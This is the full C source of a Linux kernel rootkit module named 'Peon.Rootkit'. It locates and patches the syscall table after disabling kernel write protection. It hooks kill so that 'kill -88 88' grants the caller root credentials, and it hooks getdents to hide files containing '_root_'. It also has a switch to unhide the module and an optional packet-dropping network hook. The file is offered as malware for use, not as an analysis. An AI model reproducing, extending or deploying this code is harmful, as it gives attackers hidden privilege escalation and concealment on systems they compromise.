#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/limits.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>


#define HOOK_READ
//#define NETWORK
#define DEBUG
#define SIG_4_ROOT 88
#define PID_4_ROOT 88
#define SIG_4_SHOW_MOD 22
#define PID_4_SHOW_MOD 22
#define ETH_P_ALL       0x0003

#if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
#define OS_64_BITS 1
#define KERN_MEM_BEGIN 0xffffffff81000000
#define KERN_MEM_END 0xffffffff81e42000

#else	/* 32 bits machine */
#define OS_64_BITS 0
#define KERN_MEM_BEGIN 0xc0000000	//11000000 00000000 00000000 00000000
#define KERN_MEM_END 0xd0000000		//11010000 00000000 00000000 00000000
#endif 

static struct kmem_cache *cred_jar;

struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen;
	char            d_name[1];
};

unsigned long **find_syscall_table(void)
{
	/*  Find the syscall table 
	*  search in memory the adress of a function of the syscall table (sys_close)
	*/
	unsigned long **sctable;
	unsigned long int i = KERN_MEM_BEGIN;

	while ( i < KERN_MEM_END) {

		sctable = (unsigned long **)i;

		if ( sctable[__NR_close] == (unsigned long *) sys_close) {

			return &sctable[0];

		}

		i += sizeof(void *);
	}

	return NULL;     
}



void disable_wp(void){

#if defined(__LP64__) || defined(_LP64) 

	__asm__("push   %rax\n\t"
		"mov    %cr0,%rax;\n\t"
		"and     $~(1 << 16),%rax;\n\t"
		"mov    %rax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %rax"
		);
#else

	__asm__("push   %eax\n\t"
		"mov    %cr0,%eax;\n\t"
		"and     $~(1 << 16),%eax;\n\t"
		"mov    %eax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %eax"
		);  
#endif     
}

void enable_wp(void){

#if defined(__LP64__) || defined(_LP64) 

	__asm__("push   %rax\n\t"
		"mov    %cr0,%rax;\n\t"
		"or     $(1 << 16),%rax;\n\t"
		"mov    %rax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %rax"
		);

#else
	__asm__("push   %eax\n\t"
		"mov    %cr0,%eax;\n\t"
		"or     $(1 << 16),%eax;\n\t"
		"mov    %eax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %eax"
		); 
#endif       
}




/* Adress of the syscall table */
unsigned long ** syscall_table ;

char FIRST_SHOW_MODULE = 1;
/* save packet type */
struct packet_type pt;

/* save module */
struct module *mod;

#ifdef HOOK_READ
	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
/*
		long ret = orig_read_call( fd, buf, count);
		if (fd==0){
			//printk(KERN_ALERT "Peon.Rootkit: keyboard %s",(char*)buf);
			//printk(KERN_ALERT "Peon.Rootkit: keyboard[0] = %c \n",((char*)buf)[0]);
		}
		return  ret;
*/
		return  orig_read_call( fd, buf, count);
	} 
#endif


#if defined(__LP64__) || defined(_LP64) 
/* -------------------------- 64 bits getdents version ------------------------------------------ */
asmlinkage long (*orig_getdents) (unsigned int fd,  struct linux_dirent __user *dirent,  unsigned int count);
asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *dirent, unsigned int count){

	int ret= orig_getdents( fd,  dirent, count);
	{

		unsigned long off = 0;
		struct linux_dirent __user *dir;	

		/* list directory  and hide files containing name _root_ */
		for(off=0;off<ret;){

			dir=(void*)dirent+off;
			/* hide files containing name _root_ */	
			if((strstr(dir->d_name, "_root_")) != NULL){
				printk(KERN_ALERT "Peon.Rootkit: hide.64 %s",dir->d_name);
				ret-=dir->d_reclen;
				if(dir->d_reclen+off<ret)
					memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
			}
			else
				off += dir->d_reclen;
		}
	}
	return ret;
}
#else

/* -------------------------- 32 bits getdents version ------------------------------------------ */
asmlinkage long (*orig_getdents64) (unsigned int fd,  struct linux_dirent64 __user *dirent,  unsigned int count);
asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __user *dirent, unsigned int count){

	int ret= orig_getdents64( fd,  dirent, count);
	{

		unsigned long off = 0;
		struct linux_dirent64 __user *dir;	

		/* list directory  and hide files containing name _root_ */
		for(off=0;off<ret;){

			dir=(void*)dirent+off;
			/* hide files containing name _root_ */	
			if((strstr(dir->d_name, "_root_")) != NULL){
				printk(KERN_ALERT "Peon.Rootkit: hide %s",dir->d_name);
				ret-=dir->d_reclen;
				if(dir->d_reclen+off<ret)
					memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
			}
			else
				off += dir->d_reclen;
		}
	}
	return ret;
}
#endif

asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
asmlinkage long kill_hook_call( pid_t pid, int sig){

	/* Hacked function : kill -88 88*/ 
	if((sig ==SIG_4_ROOT) &&(pid==PID_4_ROOT))
	{
		struct task_struct *cur_task;
		const struct cred *old;
		struct cred *credz;

		cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
		credz = kmem_cache_alloc(cred_jar, GFP_KERNEL);
		if (!credz)
			return kill_orig_call(pid,sig);

		/* obtain root access in shell*/
		cur_task=current;
		/**/
		old = cur_task->cred;

		/* remove warning const */
		memcpy(credz, old, sizeof(struct cred));
		credz->uid=0;
		credz->gid=0;
		credz->suid=0;
		credz->sgid=0;
		credz->euid=0;
		credz->egid=0; 
		cur_task->cred=credz;
		#ifdef DEBUG
		printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  shell root access");
		#endif
		kfree(old);
	}

	/*   show hided module  kill -22 22*/    
	if((sig ==SIG_4_SHOW_MOD) &&(pid==PID_4_SHOW_MOD) && FIRST_SHOW_MODULE){  
		FIRST_SHOW_MODULE=0; // only one try
		/*  attach save module to the list of module by seaching snd module */    	
		list_add(&mod->list,&find_module("snd")->list);   
		#ifdef DEBUG		
		printk(KERN_ALERT "Peon.Rootkit: show module");
		#endif
	}
	return kill_orig_call(pid,sig);
}


/* -------------------------------------------------------------------- */

int toto(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
{
	kfree_skb(skb);
	#ifdef DEBUG
	printk(KERN_ALERT "Peon.Rootkit: ping ping");
	#endif
	return 0;
}

int init_module(void)
{

	syscall_table = find_syscall_table();

	if (syscall_table == 0){
	#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit: System call table not found!\n");
		#endif
		return 1;
	}
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long)syscall_table);
	#endif
	
	/*  hide module  lsmod */    
	//  mod=THIS_MODULE;
	// list_del(&THIS_MODULE->list);
	FIRST_SHOW_MODULE=0;

	disable_wp();

	/*  Save the adress of the original kill syscall */
	kill_orig_call= (void *) syscall_table[__NR_kill];

	/*  Replace the syscall in the table */
	syscall_table[__NR_kill] = (void*) kill_hook_call;
#ifdef HOOK_READ
	/*  Save the adress of the original read syscall */
	orig_read_call= (void *) syscall_table[__NR_read];

	/*  Replace the syscall in the table */
	syscall_table[__NR_read] = (void*) hook_read_call;
#endif

#if defined(__LP64__) || defined(_LP64) 

	#ifdef DEBUG	
	printk(KERN_INFO "Peon.Rootkit is in 64 bits\n");
	#endif
	/*  Save the adress of the original getdents syscall */
	orig_getdents= (void *) syscall_table[__NR_getdents];

	/*  Replace the syscall in the table */
	syscall_table[__NR_getdents] = (void*) hacked_getdents;


#else
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is in 32 bits\n");
	#endif
	/*  Save the adress of the original getdents64 syscall */
	orig_getdents64= (void *) syscall_table[__NR_getdents64];

	/*  Replace the syscall in the table */
	syscall_table[__NR_getdents64] = (void*) hacked_getdents64;

#endif

	#ifdef NETWORK
	//remove interfacepacket layer2
	__dev_remove_pack( &pt ); 
	// stuff for network, call toto function  
	pt.type = htons(ETH_P_ALL);
	// pt.dev = 0;
	pt.func = toto;
	dev_add_pack(&pt);
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
	#endif
	#endif

	enable_wp(); 
	
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is loaded!\n");
	#endif
	
	return 0;
}

void cleanup_module(void)
{

	disable_wp();

	/* Set the orignal call*/ 
	syscall_table[__NR_kill ] = (void*) kill_orig_call;

	#ifdef HOOK_READ
	syscall_table[ __NR_read ] = (void*) orig_read_call;
	#endif

	#if defined(__LP64__) || defined(_LP64)  
		syscall_table[ __NR_getdents] = (void*) orig_getdents;
	#else
		syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
	#endif
	
	enable_wp(); 
	
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is unloaded!\n");
	#endif
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peondusud");
MODULE_DESCRIPTION("peondusud rootkit module");
